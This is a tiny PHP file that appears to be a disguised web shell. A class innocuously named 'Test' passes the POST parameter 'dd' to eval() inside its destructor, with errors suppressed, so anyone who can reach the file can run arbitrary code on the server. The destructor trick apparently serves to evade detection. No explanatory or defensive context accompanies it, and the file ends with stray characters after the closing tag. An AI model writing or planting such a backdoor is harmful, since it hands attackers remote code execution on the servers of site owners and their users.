<?php
class  Test{
    public $name = '';
    function __destruct(){
        @eval("$this->name");
    }
}

$test= new Test();
$c = @$_POST['dd'];
$test->name = $c;
?>egm